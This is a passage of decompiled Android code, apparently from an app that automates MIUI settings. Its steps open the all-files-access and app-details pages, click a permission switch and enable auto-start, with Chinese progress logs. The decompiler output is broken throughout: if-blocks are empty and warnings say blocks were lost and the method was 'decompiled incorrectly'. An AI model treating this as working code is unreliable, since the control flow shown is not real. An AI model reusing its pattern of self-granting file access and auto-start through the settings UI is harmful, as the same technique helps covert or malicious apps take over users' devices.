                                                    miuiSteps$executeAllFilesAccessFlow$1.f54326a2 = str2;
                                                    miuiSteps$executeAllFilesAccessFlow$1.f54327a3 = i;
                                                    miuiSteps$executeAllFilesAccessFlow$1.f54328a4 = i11;
                                                    miuiSteps$executeAllFilesAccessFlow$1.f54329a5 = i10;
                                                    miuiSteps$executeAllFilesAccessFlow$1.f54330a6 = i12;
                                                    miuiSteps$executeAllFilesAccessFlow$1.f54331a7 = i12;
                                                    miuiSteps$executeAllFilesAccessFlow$1.f54334b0 = 9;
                                                    if (b81.m210571b1(150L, miuiSteps$executeAllFilesAccessFlow$1) != coroutineSingletons) {
                                                        i13 = i12;
                                                        if (Environment.isExternalStorageManager()) {
                                                            c0367a4.m212274d8("[文件访问] 验证第" + (i12 + 1) + "次: 未开启，继续等待...");
                                                        } else {
                                                            c0367a4.m212274d8("[文件访问] ✅ 权限已成功开启 (验证第" + (i12 + 1) + "次)");
                                                            ref$BooleanRef.f57622a0 = true;
                                                        }
                                                        i12 = i13 + 1;
                                                        str2 = null;
                                                        if (i12 >= i10) {
                                                        }
                                                    }
                                                }
                                            }
                                        }
                                    } else {
                                        i9 = i4;
                                        i8 = i5;
                                        i = i6;
                                        c0367a4 = c0367a43;
                                        if (i9 == 0) {
                                        }
                                        if (i9 == 0) {
                                        }
                                        if (i12 >= i10) {
                                        }
                                    }
                                }
                            }
                        }
                    }
                    return coroutineSingletons;
                }
                i3 = 3;
                if (i2 == 0) {
                }
                c0367a4.m212274d8("[文件访问] " + (i2 == 0 ? "打开" : "重新打开") + "设置页面");
                Context context22 = c0367a4.f55107a1;
                Intent intent32 = new Intent("android.settings.MANAGE_APP_ALL_FILES_ACCESS_PERMISSION");
                intent32.setData(Uri.parse("package:" + context22.getPackageName()));
                intent32.setFlags(276824064);
                context22.startActivity(intent32);
                miuiSteps$executeAllFilesAccessFlow$1.f54324a0 = c0367a4;
                miuiSteps$executeAllFilesAccessFlow$1.f54325a1 = str2;
                miuiSteps$executeAllFilesAccessFlow$1.f54326a2 = str2;
                miuiSteps$executeAllFilesAccessFlow$1.f54327a3 = i;
                miuiSteps$executeAllFilesAccessFlow$1.f54328a4 = i2;
                miuiSteps$executeAllFilesAccessFlow$1.f54334b0 = 4;
                miuiSteps$executeAllFilesAccessFlow$12 = miuiSteps$executeAllFilesAccessFlow$1;
                c0367a44 = c0367a4;
                if (c0367a44.m212294f9(2, 100L, 1500L, miuiSteps$executeAllFilesAccessFlow$12) != coroutineSingletons) {
                }
                return coroutineSingletons;
            case 1:
                i2 = miuiSteps$executeAllFilesAccessFlow$1.f54328a4;
                i = miuiSteps$executeAllFilesAccessFlow$1.f54327a3;
                c0367a4 = miuiSteps$executeAllFilesAccessFlow$1.f54324a0;
                kg1.m213544f4(obj);
                c0367a4.m212274d8("[文件访问] 📱 重新打开应用详情页面...");
                Context context4 = c0367a4.f55107a1;
                if (Build.VERSION.SDK_INT < 35) {
                }
                miuiSteps$executeAllFilesAccessFlow$1.f54324a0 = c0367a4;
                miuiSteps$executeAllFilesAccessFlow$1.f54327a3 = i;
                miuiSteps$executeAllFilesAccessFlow$1.f54328a4 = i2;
                miuiSteps$executeAllFilesAccessFlow$1.f54334b0 = i16;
                miuiSteps$executeAllFilesAccessFlow$13 = miuiSteps$executeAllFilesAccessFlow$1;
                c0367a45 = c0367a4;
                if (c0367a45.m212294f9(2, 100L, 2000L, miuiSteps$executeAllFilesAccessFlow$13) != coroutineSingletons) {
                }
                return coroutineSingletons;
            case 2:
                i2 = miuiSteps$executeAllFilesAccessFlow$1.f54328a4;
                i = miuiSteps$executeAllFilesAccessFlow$1.f54327a3;
                c0367a4 = miuiSteps$executeAllFilesAccessFlow$1.f54324a0;
                kg1.m213544f4(obj);
                c0367a4.m212274d8("[文件访问] ✅ 应用详情页面已重新打开");
                miuiSteps$executeAllFilesAccessFlow$1.f54324a0 = c0367a4;
                miuiSteps$executeAllFilesAccessFlow$1.f54327a3 = i;
                miuiSteps$executeAllFilesAccessFlow$1.f54328a4 = i2;
                i3 = 3;
                miuiSteps$executeAllFilesAccessFlow$1.f54334b0 = 3;
                if (b81.m210571b1(300L, miuiSteps$executeAllFilesAccessFlow$1) != coroutineSingletons) {
                }
                return coroutineSingletons;
            case 3:
                i2 = miuiSteps$executeAllFilesAccessFlow$1.f54328a4;
                i = miuiSteps$executeAllFilesAccessFlow$1.f54327a3;
                c0367a4 = miuiSteps$executeAllFilesAccessFlow$1.f54324a0;
                kg1.m213544f4(obj);
                i3 = 3;
                if (i2 == 0) {
                }
                c0367a4.m212274d8("[文件访问] " + (i2 == 0 ? "打开" : "重新打开") + "设置页面");
                Context context222 = c0367a4.f55107a1;
                Intent intent322 = new Intent("android.settings.MANAGE_APP_ALL_FILES_ACCESS_PERMISSION");
                intent322.setData(Uri.parse("package:" + context222.getPackageName()));
                intent322.setFlags(276824064);
                context222.startActivity(intent322);
                miuiSteps$executeAllFilesAccessFlow$1.f54324a0 = c0367a4;
                miuiSteps$executeAllFilesAccessFlow$1.f54325a1 = str2;
                miuiSteps$executeAllFilesAccessFlow$1.f54326a2 = str2;
                miuiSteps$executeAllFilesAccessFlow$1.f54327a3 = i;
                miuiSteps$executeAllFilesAccessFlow$1.f54328a4 = i2;
                miuiSteps$executeAllFilesAccessFlow$1.f54334b0 = 4;
                miuiSteps$executeAllFilesAccessFlow$12 = miuiSteps$executeAllFilesAccessFlow$1;
                c0367a44 = c0367a4;
                if (c0367a44.m212294f9(2, 100L, 1500L, miuiSteps$executeAllFilesAccessFlow$12) != coroutineSingletons) {
                }
                return coroutineSingletons;
            case 4:
                i2 = miuiSteps$executeAllFilesAccessFlow$1.f54328a4;
                i = miuiSteps$executeAllFilesAccessFlow$1.f54327a3;
                c0367a42 = miuiSteps$executeAllFilesAccessFlow$1.f54324a0;
                kg1.m213544f4(obj);
                i3 = 3;
                if (!Environment.isExternalStorageManager()) {
                }
                break;
            case 5:
                i4 = miuiSteps$executeAllFilesAccessFlow$1.f54329a5;
                i5 = miuiSteps$executeAllFilesAccessFlow$1.f54328a4;
                i6 = miuiSteps$executeAllFilesAccessFlow$1.f54327a3;
                str = miuiSteps$executeAllFilesAccessFlow$1.f54326a2;
                it = (Iterator) miuiSteps$executeAllFilesAccessFlow$1.f54325a1;
                c0367a43 = miuiSteps$executeAllFilesAccessFlow$1.f54324a0;
                kg1.m213544f4(obj);
                objM212285f0 = obj;
                i3 = 3;
                if (!((Boolean) objM212285f0).booleanValue()) {
                    if (!it.hasNext()) {
                    }
                    return coroutineSingletons;
                }
                c0367a43.m212274d8("[文件访问] ✅ 通过「" + str + "」开启成功");
                i4 = 1;
                if (i4 != 0) {
                }
                break;
            case 6:
                int i19 = miuiSteps$executeAllFilesAccessFlow$1.f54329a5;
                int i20 = miuiSteps$executeAllFilesAccessFlow$1.f54328a4;
                i6 = miuiSteps$executeAllFilesAccessFlow$1.f54327a3;
                C0367a4 c0367a46 = miuiSteps$executeAllFilesAccessFlow$1.f54324a0;
                kg1.m213544f4(obj);
                i7 = i19;
                i8 = i20;
                c0367a43 = c0367a46;
                objM212262c1 = obj;
                i3 = 3;
                if (((Boolean) objM212262c1).booleanValue()) {
                }
                break;
            case 7:
                i8 = miuiSteps$executeAllFilesAccessFlow$1.f54328a4;
                i = miuiSteps$executeAllFilesAccessFlow$1.f54327a3;
                c0367a4 = miuiSteps$executeAllFilesAccessFlow$1.f54324a0;
                kg1.m213544f4(obj);
                i3 = 3;
                c0367a4.m212274d8("[文件访问] ✅ Switch控件已点击");
                i9 = 1;
                if (i9 == 0) {
                }
                if (i9 == 0) {
                }
                if (i12 >= i10) {
                }
                break;
            case 8:
                i8 = miuiSteps$executeAllFilesAccessFlow$1.f54328a4;
                i = miuiSteps$executeAllFilesAccessFlow$1.f54327a3;
                c0367a4 = miuiSteps$executeAllFilesAccessFlow$1.f54324a0;
                kg1.m213544f4(obj);
                i3 = 3;
                i9 = 1;
                if (i9 == 0) {
                }
                if (i12 >= i10) {
                }
                break;
            case 9:
                i12 = miuiSteps$executeAllFilesAccessFlow$1.f54331a7;
                int i21 = miuiSteps$executeAllFilesAccessFlow$1.f54330a6;
                i10 = miuiSteps$executeAllFilesAccessFlow$1.f54329a5;
                i11 = miuiSteps$executeAllFilesAccessFlow$1.f54328a4;
                int i22 = miuiSteps$executeAllFilesAccessFlow$1.f54327a3;
                ref$BooleanRef = (Ref$BooleanRef) miuiSteps$executeAllFilesAccessFlow$1.f54325a1;
                C0367a4 c0367a47 = miuiSteps$executeAllFilesAccessFlow$1.f54324a0;
                kg1.m213544f4(obj);
                c0367a4 = c0367a47;
                i = i22;
                i13 = i21;
                if (Environment.isExternalStorageManager()) {
                }
                i12 = i13 + 1;
                str2 = null;
                if (i12 >= i10) {
                }
                break;
            default:
                throw new IllegalStateException("call to 'resume' before 'invoke' with coroutine");
        }
    }

    /* JADX WARN: Code restructure failed: missing block: B:58:0x01b0, code lost:
    
        if (p000.b81.m210571b1(500, r2) == r3) goto L59;
     */
    /* JADX WARN: Multi-variable type inference failed */
    /* JADX WARN: Removed duplicated region for block: B:30:0x0104  */
    /* JADX WARN: Removed duplicated region for block: B:33:0x0111  */
    /* JADX WARN: Removed duplicated region for block: B:38:0x0138  */
    /* JADX WARN: Removed duplicated region for block: B:43:0x0155  */
    /* JADX WARN: Removed duplicated region for block: B:44:0x0157  */
    /* JADX WARN: Removed duplicated region for block: B:48:0x016a  */
    /* JADX WARN: Removed duplicated region for block: B:51:0x0177  */
    /* JADX WARN: Removed duplicated region for block: B:52:0x017d  */
    /* JADX WARN: Removed duplicated region for block: B:62:0x01b6  */
    /* JADX WARN: Removed duplicated region for block: B:65:0x01c8  */
    /* JADX WARN: Removed duplicated region for block: B:66:0x01cb  */
    /* JADX WARN: Removed duplicated region for block: B:68:0x01cf  */
    /* JADX WARN: Removed duplicated region for block: B:69:0x01d2  */
    /* JADX WARN: Removed duplicated region for block: B:71:0x01d6  */
    /* JADX WARN: Removed duplicated region for block: B:72:0x01d9  */
    /* JADX WARN: Removed duplicated region for block: B:75:0x01fd  */
    /* JADX WARN: Removed duplicated region for block: B:76:0x01ff  */
    /* JADX WARN: Removed duplicated region for block: B:7:0x0017  */
    /* JADX WARN: Unsupported multi-entry loop pattern (BACK_EDGE: B:56:0x019d -> B:60:0x01b3). Please report as a decompilation issue!!! */
    /* JADX WARN: Unsupported multi-entry loop pattern (BACK_EDGE: B:58:0x01b0 -> B:61:0x01b4). Please report as a decompilation issue!!! */
    /* renamed from: b4 */
    /*
        Code decompiled incorrectly, please refer to instructions dump.
    */
    public final Object m212255b4(ContinuationImpl continuationImpl) throws Throwable {
        MiuiSteps$executeAutoStartInAppDetails$1 miuiSteps$executeAutoStartInAppDetails$1;
        int i;
        C0367a4 c0367a4;
        int i2;
        int i3;
        int i4;
        boolean zBooleanValue;
        int i5;
        C0367a4 c0367a42;
        int i6;
        char c;
        Object objM212290f5;
        int i7;
        C0367a4 c0367a43;
        int i8;
        C0367a4 c0367a44;
        int i9;
        Boolean boolM212275d9;
        if (continuationImpl instanceof MiuiSteps$executeAutoStartInAppDetails$1) {
            miuiSteps$executeAutoStartInAppDetails$1 = (MiuiSteps$executeAutoStartInAppDetails$1) continuationImpl;
            int i10 = miuiSteps$executeAutoStartInAppDetails$1.f54343a8;
            if ((i10 & Integer.MIN_VALUE) != 0) {
                miuiSteps$executeAutoStartInAppDetails$1.f54343a8 = i10 - Integer.MIN_VALUE;
            } else {
                miuiSteps$executeAutoStartInAppDetails$1 = new MiuiSteps$executeAutoStartInAppDetails$1(this, continuationImpl);
            }
        }
        Object obj = miuiSteps$executeAutoStartInAppDetails$1.f54341a6;
        CoroutineSingletons coroutineSingletons = CoroutineSingletons.f57606a0;
        int i11 = miuiSteps$executeAutoStartInAppDetails$1.f54343a8;
        int i12 = 2;
        int i13 = 3;
        if (i11 == 0) {
            kg1.m213544f4(obj);
            m212274d8("│");
            m212274d8("│ ┌─ [步骤13] 自启动设置 ─────────────────────────────");
            m212274d8("│ │ 📋 目标: 在应用详情中开启自启动开关（重要权限）");
            m212274d8("│ │");
            AbstractC0003a2.m45c6("│ │   📦 包名: ", this.f55107a1.getPackageName(), this);
            int i14 = Build.VERSION.SDK_INT;
            m212274d8("│ │   🤖 SDK: " + i14);
            i = i14 >= 35 ? 1 : 0;
            c0367a4 = this;
            i2 = 3;
            i3 = 1;
            i4 = 0;
            c0367a4.m212274d8("│ │");
            c0367a4.m212274d8("│ │ ========== 第" + i3 + "/" + i2 + "次尝试 ==========");
            miuiSteps$executeAutoStartInAppDetails$1.f54335a0 = c0367a4;
            miuiSteps$executeAutoStartInAppDetails$1.f54336a1 = i;
            miuiSteps$executeAutoStartInAppDetails$1.f54337a2 = i4;
            miuiSteps$executeAutoStartInAppDetails$1.f54338a3 = i2;
            miuiSteps$executeAutoStartInAppDetails$1.f54339a4 = i3;
            miuiSteps$executeAutoStartInAppDetails$1.f54343a8 = 1;
            boolM212275d9 = c0367a4.m212275d9();
            if (boolM212275d9 != coroutineSingletons) {
            }
            return coroutineSingletons;
        }
        if (i11 == 1) {
            i7 = miuiSteps$executeAutoStartInAppDetails$1.f54339a4;
            i8 = miuiSteps$executeAutoStartInAppDetails$1.f54338a3;
            int i15 = miuiSteps$executeAutoStartInAppDetails$1.f54337a2;
            int i16 = miuiSteps$executeAutoStartInAppDetails$1.f54336a1;
            c0367a44 = miuiSteps$executeAutoStartInAppDetails$1.f54335a0;
            kg1.m213544f4(obj);
            i4 = i15;
            i9 = i16;
            if (((Boolean) obj).booleanValue()) {
            }
            return coroutineSingletons;
        }
        if (i11 == 2) {
            i7 = miuiSteps$executeAutoStartInAppDetails$1.f54339a4;
            int i17 = miuiSteps$executeAutoStartInAppDetails$1.f54338a3;
            int i18 = miuiSteps$executeAutoStartInAppDetails$1.f54337a2;
            int i19 = miuiSteps$executeAutoStartInAppDetails$1.f54336a1;
            C0367a4 c0367a45 = miuiSteps$executeAutoStartInAppDetails$1.f54335a0;
            kg1.m213544f4(obj);
            i5 = i17;
            c0367a42 = c0367a45;
            zBooleanValue = i18;
            i6 = i19;
            c = 4;
            if (i7 != i5) {
            }
            c0367a42.m212274d8("│ │");
            if (zBooleanValue == 0) {
            }
            if (zBooleanValue == 0) {
            }
            if (zBooleanValue == 0) {
            }
            StringBuilder sbM41c2 = AbstractC0003a2.m41c2("│ │ ", str, " 步骤13 自启动设置", str, "（共尝试");
            sbM41c2.append(strValueOf);
            sbM41c2.append("次）");
            c0367a42.m212274d8(sbM41c2.toString());
            c0367a42.m212274d8("│ └──────────────────────────────────────────────────────");
            return Boolean.valueOf(zBooleanValue == 0);
        }
        if (i11 == 3) {
            i7 = miuiSteps$executeAutoStartInAppDetails$1.f54338a3;
            i8 = miuiSteps$executeAutoStartInAppDetails$1.f54337a2;
            i6 = miuiSteps$executeAutoStartInAppDetails$1.f54336a1;
            c0367a43 = miuiSteps$executeAutoStartInAppDetails$1.f54335a0;
            kg1.m213544f4(obj);
            if (i6 == 0) {
            }
            miuiSteps$executeAutoStartInAppDetails$1.f54335a0 = c0367a43;
            miuiSteps$executeAutoStartInAppDetails$1.f54336a1 = i6;
            miuiSteps$executeAutoStartInAppDetails$1.f54337a2 = i8;
            miuiSteps$executeAutoStartInAppDetails$1.f54338a3 = i7;
            c = 4;
            miuiSteps$executeAutoStartInAppDetails$1.f54343a8 = 4;
            objM212290f5 = c0367a43.m212290f5(z, miuiSteps$executeAutoStartInAppDetails$1);
            if (objM212290f5 != coroutineSingletons) {
            }
            return coroutineSingletons;
        }
        if (i11 != 4) {
            if (i11 != 5) {
                throw new IllegalStateException("call to 'resume' before 'invoke' with coroutine");
            }
            i7 = miuiSteps$executeAutoStartInAppDetails$1.f54338a3;
            i5 = miuiSteps$executeAutoStartInAppDetails$1.f54337a2;
            boolean z = miuiSteps$executeAutoStartInAppDetails$1.f54340a5;
            i6 = miuiSteps$executeAutoStartInAppDetails$1.f54336a1;
            c0367a42 = miuiSteps$executeAutoStartInAppDetails$1.f54335a0;
            kg1.m213544f4(obj);
            c = 4;
            zBooleanValue = z;
            if (i7 != i5) {
                C0367a4 c0367a46 = c0367a42;
                i3 = i7 + 1;
                c0367a4 = c0367a46;
                i = i6;
                i2 = i5;
                i4 = zBooleanValue ? 1 : 0;
                i12 = 2;
                i13 = 3;
                c0367a4.m212274d8("│ │");
                c0367a4.m212274d8("│ │ ========== 第" + i3 + "/" + i2 + "次尝试 ==========");
                miuiSteps$executeAutoStartInAppDetails$1.f54335a0 = c0367a4;
                miuiSteps$executeAutoStartInAppDetails$1.f54336a1 = i;
                miuiSteps$executeAutoStartInAppDetails$1.f54337a2 = i4;
                miuiSteps$executeAutoStartInAppDetails$1.f54338a3 = i2;
                miuiSteps$executeAutoStartInAppDetails$1.f54339a4 = i3;
                miuiSteps$executeAutoStartInAppDetails$1.f54343a8 = 1;
                boolM212275d9 = c0367a4.m212275d9();
                if (boolM212275d9 != coroutineSingletons) {
                    c0367a44 = c0367a4;
                    i7 = i3;
                    i8 = i2;
                    i9 = i;
                    obj = boolM212275d9;
                    if (((Boolean) obj).booleanValue()) {
                        c0367a44.m212274d8("│ │   ❌ 打开应用详情失败，重试...");
                        miuiSteps$executeAutoStartInAppDetails$1.f54335a0 = c0367a44;
                        miuiSteps$executeAutoStartInAppDetails$1.f54336a1 = i9;
                        miuiSteps$executeAutoStartInAppDetails$1.f54337a2 = i4;
                        miuiSteps$executeAutoStartInAppDetails$1.f54338a3 = i8;
                        miuiSteps$executeAutoStartInAppDetails$1.f54339a4 = i7;
                        miuiSteps$executeAutoStartInAppDetails$1.f54343a8 = i12;
                        if (b81.m210571b1(500L, miuiSteps$executeAutoStartInAppDetails$1) != coroutineSingletons) {
                            int i20 = i4;
                            i5 = i8;
                            c0367a42 = c0367a44;
                            zBooleanValue = i20;
                            i6 = i9;
                            c = 4;
                            if (i7 != i5) {
                            }
                        }
                    } else {
                        c0367a44.m212274d8("│ │   ⏳ 打开应用详情成功，延时1.5秒...");
                        miuiSteps$executeAutoStartInAppDetails$1.f54335a0 = c0367a44;
                        miuiSteps$executeAutoStartInAppDetails$1.f54336a1 = i9;
                        miuiSteps$executeAutoStartInAppDetails$1.f54337a2 = i8;
                        miuiSteps$executeAutoStartInAppDetails$1.f54338a3 = i7;
                        miuiSteps$executeAutoStartInAppDetails$1.f54343a8 = i13;
                        int i21 = i9;
                        if (b81.m210571b1(1500L, miuiSteps$executeAutoStartInAppDetails$1) != coroutineSingletons) {
                            i6 = i21;
                            c0367a43 = c0367a44;
                            boolean z2 = i6 == 0;
                            miuiSteps$executeAutoStartInAppDetails$1.f54335a0 = c0367a43;
                            miuiSteps$executeAutoStartInAppDetails$1.f54336a1 = i6;
                            miuiSteps$executeAutoStartInAppDetails$1.f54337a2 = i8;
                            miuiSteps$executeAutoStartInAppDetails$1.f54338a3 = i7;
                            c = 4;
                            miuiSteps$executeAutoStartInAppDetails$1.f54343a8 = 4;
                            objM212290f5 = c0367a43.m212290f5(z2, miuiSteps$executeAutoStartInAppDetails$1);
                            if (objM212290f5 != coroutineSingletons) {
                                C0367a4 c0367a47 = c0367a43;
                                i5 = i8;
                                c0367a42 = c0367a47;
                                zBooleanValue = ((Boolean) objM212290f5).booleanValue();
                                if (zBooleanValue == 0) {
                                    c0367a42.m212274d8("│ │   ❌ 第" + i7 + "次尝试失败，" + (i7 < i5 ? "重新打开应用详情重试..." : "已达到最大重试次数"));
                                    zBooleanValue = zBooleanValue;
                                    if (i7 < i5) {
                                        miuiSteps$executeAutoStartInAppDetails$1.f54335a0 = c0367a42;
                                        miuiSteps$executeAutoStartInAppDetails$1.f54336a1 = i6;
                                        miuiSteps$executeAutoStartInAppDetails$1.f54340a5 = zBooleanValue;
                                        miuiSteps$executeAutoStartInAppDetails$1.f54337a2 = i5;
                                        miuiSteps$executeAutoStartInAppDetails$1.f54338a3 = i7;
                                        miuiSteps$executeAutoStartInAppDetails$1.f54343a8 = 5;
                                    }
                                    if (i7 != i5) {
                                    }
                                } else {
                                    c0367a42.m212274d8("│ │   ✅ 自启动开启成功！");
                                }
                            }
                        }
                    }
                }
                return coroutineSingletons;
            }
            c0367a42.m212274d8("│ │");
            String str = zBooleanValue == 0 ? "✅" : "⚠️";
            String str2 = zBooleanValue == 0 ? "完成" : "可能未完成";
            String strValueOf = zBooleanValue == 0 ? "1" : String.valueOf(i5);
            StringBuilder sbM41c22 = AbstractC0003a2.m41c2("│ │ ", str, " 步骤13 自启动设置", str2, "（共尝试");
            sbM41c22.append(strValueOf);
            sbM41c22.append("次）");
            c0367a42.m212274d8(sbM41c22.toString());
            c0367a42.m212274d8("│ └──────────────────────────────────────────────────────");
            return Boolean.valueOf(zBooleanValue == 0);
        }
        i7 = miuiSteps$executeAutoStartInAppDetails$1.f54338a3;
        int i22 = miuiSteps$executeAutoStartInAppDetails$1.f54337a2;
        i6 = miuiSteps$executeAutoStartInAppDetails$1.f54336a1;
        C0367a4 c0367a48 = miuiSteps$executeAutoStartInAppDetails$1.f54335a0;
        kg1.m213544f4(obj);
        i5 = i22;
        c0367a42 = c0367a48;
        c = 4;
        objM212290f5 = obj;
        zBooleanValue = ((Boolean) objM212290f5).booleanValue();
        if (zBooleanValue == 0) {
        }
    }

    /* JADX WARN: Can't wrap try/catch for region: R(10:52|347|53|54|353|55|56|355|57|(2:71|(4:74|75|121|(6:122|116|(1:124)|125|126|(0))(0)))(2:76|(3:79|80|(4:83|84|(4:86|(4:89|(2:93|(2:94|(2:96|(2:377|98)(1:99))(1:378)))|(2:375|103)(1:102)|87)|376|103)(1:104)|(1:106)(2:109|(3:112|113|(6:115|116|(0)|125|126|(0))(2:117|(4:120|75|121|(0)(0))))))))) */
    /* JADX WARN: Can't wrap try/catch for region: R(8:61|62|65|349|66|(0)(0)|48|343) */
    /* JADX WARN: Code restructure failed: missing block: B:107:0x0707, code lost:
    
        if (p000.b81.m210571b1(150, r2) == r3) goto L48;
     */
    /* JADX WARN: Code restructure failed: missing block: B:59:0x0589, code lost:
    
        r0 = e;
     */
    /* JADX WARN: Code restructure failed: missing block: B:61:0x058b, code lost:
    
        r0 = e;
     */
    /* JADX WARN: Code restructure failed: missing block: B:62:0x058c, code lost:
    
        r32 = r14;
     */
    /* JADX WARN: Code restructure failed: missing block: B:65:0x0593, code lost:
    
        r13.m212274d8("[应用详情] ⚠️ 安全中心打开失败: " + r0.getMessage() + "，尝试标准方式");
        r13.m212274d8("[应用详情] 🔹 备用：使用标准Settings打开");
     */
    /* JADX WARN: Code restructure failed: missing block: B:66:0x05b2, code lost:
    
        r0 = new android.content.Intent("android.settings.APPLICATION_DETAILS_SETTINGS");
        r0.setData(android.net.Uri.parse("package:" + r7.getPackageName()));
        r0.setFlags(1350631424);
        r7.startActivity(r0);
        r13.m212274d8("[应用详情] ✅ 标准应用详情已打开（无自启动）");
     */
    /* JADX WARN: Code restructure failed: missing block: B:68:0x05de, code lost:
    
        r0 = move-exception;
     */
    /* JADX WARN: Code restructure failed: missing block: B:69:0x05df, code lost:
    
        p000.AbstractC0003a2.m45c6("[应用详情] ❌ 打开失败: ", r0.getMessage(), r13);
        r29 = false;
     */
    /* JADX WARN: Multi-variable type inference failed */
    /* JADX WARN: Path cross not found for [B:132:0x07dc, B:140:0x0804], limit reached: 359 */
    /* JADX WARN: Path cross not found for [B:140:0x0804, B:132:0x07dc], limit reached: 359 */
    /* JADX WARN: Path cross not found for [B:266:0x0d71, B:267:0x0d77], limit reached: 359 */
    /* JADX WARN: Removed duplicated region for block: B:104:0x06e1  */
    /* JADX WARN: Removed duplicated region for block: B:106:0x06e5  */
    /* JADX WARN: Removed duplicated region for block: B:109:0x070b  */
    /* JADX WARN: Removed duplicated region for block: B:115:0x0733  */
    /* JADX WARN: Removed duplicated region for block: B:117:0x073c  */
    /* JADX WARN: Removed duplicated region for block: B:122:0x0773  */
    /* JADX WARN: Removed duplicated region for block: B:124:0x077d  */
    /* JADX WARN: Removed duplicated region for block: B:129:0x07cc  */
    /* JADX WARN: Removed duplicated region for block: B:132:0x07dc  */
    /* JADX WARN: Removed duplicated region for block: B:143:0x0826  */
    /* JADX WARN: Removed duplicated region for block: B:147:0x084b  */
    /* JADX WARN: Removed duplicated region for block: B:150:0x0856  */
    /* JADX WARN: Removed duplicated region for block: B:151:0x085c  */
    /* JADX WARN: Removed duplicated region for block: B:160:0x08a6  */
    /* JADX WARN: Removed duplicated region for block: B:161:0x08b3  */
    /* JADX WARN: Removed duplicated region for block: B:165:0x08d0  */
    /* JADX WARN: Removed duplicated region for block: B:171:0x0900  */
    /* JADX WARN: Removed duplicated region for block: B:178:0x0943  */
    /* JADX WARN: Removed duplicated region for block: B:181:0x0950  */
    /* JADX WARN: Removed duplicated region for block: B:182:0x0956  */
    /* JADX WARN: Removed duplicated region for block: B:184:0x095f  */
    /* JADX WARN: Removed duplicated region for block: B:188:0x0982  */
    /* JADX WARN: Removed duplicated region for block: B:190:0x0985  */
    /* JADX WARN: Removed duplicated region for block: B:194:0x09ab  */
    /* JADX WARN: Removed duplicated region for block: B:198:0x0a31  */
    /* JADX WARN: Removed duplicated region for block: B:200:0x0a3e  */
    /* JADX WARN: Removed duplicated region for block: B:203:0x0a50  */
    /* JADX WARN: Removed duplicated region for block: B:208:0x0a8b  */
    /* JADX WARN: Removed duplicated region for block: B:214:0x0ae2  */
    /* JADX WARN: Removed duplicated region for block: B:221:0x0b6c  */
    /* JADX WARN: Removed duplicated region for block: B:225:0x0bae  */
    /* JADX WARN: Removed duplicated region for block: B:231:0x0c07  */
    /* JADX WARN: Removed duplicated region for block: B:236:0x0c5d  */
    /* JADX WARN: Removed duplicated region for block: B:237:0x0c77  */
    /* JADX WARN: Removed duplicated region for block: B:239:0x0c8b  */
    /* JADX WARN: Removed duplicated region for block: B:242:0x0cc0  */
    /* JADX WARN: Removed duplicated region for block: B:244:0x0cd6  */
    /* JADX WARN: Removed duplicated region for block: B:259:0x0d41  */
    /* JADX WARN: Removed duplicated region for block: B:274:0x0d93  */
    /* JADX WARN: Removed duplicated region for block: B:283:0x0db8  */
    /* JADX WARN: Removed duplicated region for block: B:291:0x0dd9  */
    /* JADX WARN: Removed duplicated region for block: B:293:0x0ddf  */
    /* JADX WARN: Removed duplicated region for block: B:294:0x0deb  */
    /* JADX WARN: Removed duplicated region for block: B:299:0x0e1b  */
    /* JADX WARN: Removed duplicated region for block: B:301:0x0e34  */
    /* JADX WARN: Removed duplicated region for block: B:302:0x0e4f  */
    /* JADX WARN: Removed duplicated region for block: B:304:0x0e60  */
    /* JADX WARN: Removed duplicated region for block: B:306:0x0e68  */
    /* JADX WARN: Removed duplicated region for block: B:311:0x0ea3  */
    /* JADX WARN: Removed duplicated region for block: B:312:0x0ea8  */
    /* JADX WARN: Removed duplicated region for block: B:335:0x0f91  */
    /* JADX WARN: Removed duplicated region for block: B:340:0x0fa8  */
    /* JADX WARN: Removed duplicated region for block: B:368:0x0d9d A[SYNTHETIC] */
    /* JADX WARN: Removed duplicated region for block: B:380:? A[RETURN, SYNTHETIC] */
    /* JADX WARN: Removed duplicated region for block: B:386:? A[RETURN, SYNTHETIC] */
    /* JADX WARN: Removed duplicated region for block: B:52:0x0536  */
    /* JADX WARN: Removed duplicated region for block: B:71:0x05ec  */
    /* JADX WARN: Removed duplicated region for block: B:76:0x061a  */
    /* JADX WARN: Removed duplicated region for block: B:7:0x0017  */
    /* JADX WARN: Removed duplicated region for block: B:83:0x0666  */
    /* JADX WARN: Removed duplicated region for block: B:86:0x0672  */
    /* JADX WARN: Type inference failed for: r0v138, types: [java.util.Set] */
    /* JADX WARN: Type inference failed for: r0v147, types: [java.util.Set] */
    /* JADX WARN: Type inference failed for: r0v155, types: [java.util.Set] */
    /* JADX WARN: Type inference failed for: r0v166, types: [java.util.Set] */
    /* JADX WARN: Type inference failed for: r0v176, types: [java.util.Set] */
    /* JADX WARN: Type inference failed for: r10v106, types: [java.util.Set] */
    /* JADX WARN: Type inference failed for: r10v53, types: [java.util.Set] */
    /* JADX WARN: Type inference failed for: r10v55, types: [java.util.Set] */
    /* JADX WARN: Type inference failed for: r10v57, types: [java.util.Set] */
    /* JADX WARN: Type inference failed for: r10v59, types: [java.util.Set] */
    /* JADX WARN: Unsupported multi-entry loop pattern (BACK_EDGE: B:107:0x0707 -> B:75:0x0615). Please report as a decompilation issue!!! */
    /* JADX WARN: Unsupported multi-entry loop pattern (BACK_EDGE: B:112:0x0726 -> B:113:0x072b). Please report as a decompilation issue!!! */
    /* JADX WARN: Unsupported multi-entry loop pattern (BACK_EDGE: B:187:0x0979 -> B:163:0x08c5). Please report as a decompilation issue!!! */
    /* JADX WARN: Unsupported multi-entry loop pattern (BACK_EDGE: B:236:0x0c5d -> B:223:0x0ba8). Please report as a decompilation issue!!! */
    /* JADX WARN: Unsupported multi-entry loop pattern (BACK_EDGE: B:301:0x0e34 -> B:206:0x0a85). Please report as a decompilation issue!!! */
    /* JADX WARN: Unsupported multi-entry loop pattern (BACK_EDGE: B:306:0x0e68 -> B:201:0x0a4a). Please report as a decompilation issue!!! */
    /* JADX WARN: Unsupported multi-entry loop pattern (BACK_EDGE: B:320:0x0ee5 -> B:321:0x0ee7). Please report as a decompilation issue!!! */
    /* JADX WARN: Unsupported multi-entry loop pattern (BACK_EDGE: B:323:0x0ef4 -> B:322:0x0eef). Please report as a decompilation issue!!! */
    /* JADX WARN: Unsupported multi-entry loop pattern (BACK_EDGE: B:329:0x0f43 -> B:321:0x0ee7). Please report as a decompilation issue!!! */
    /* JADX WARN: Unsupported multi-entry loop pattern (BACK_EDGE: B:346:0x0ff7 -> B:322:0x0eef). Please report as a decompilation issue!!! */
